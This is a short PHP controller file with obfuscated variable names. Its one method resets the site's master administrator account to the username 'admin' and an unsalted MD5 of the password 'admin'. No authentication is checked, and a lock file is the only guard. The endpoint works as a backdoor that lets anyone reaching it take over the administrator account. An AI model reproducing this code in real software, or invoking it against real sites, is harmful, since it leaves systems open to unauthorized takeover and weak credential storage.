<?php class repassAction extends action {
	public function repass() {
		$var_b5ae185e = TEMP_PATH . 'repass.lock';
		if (is_file($var_b5ae185e)) {
			exit('0');
		} 
		$var_5f841fb5 = array();
		$var_5f841fb5['name'] = 'admin';
		$var_5f841fb5['pass'] = md5('admin');
		$var_de5c1562 = txtDB('master') -> where('id=1') -> data($var_5f841fb5) -> save();
		write($var_b5ae185e, time());
		exit('1');
	} 
} 

?>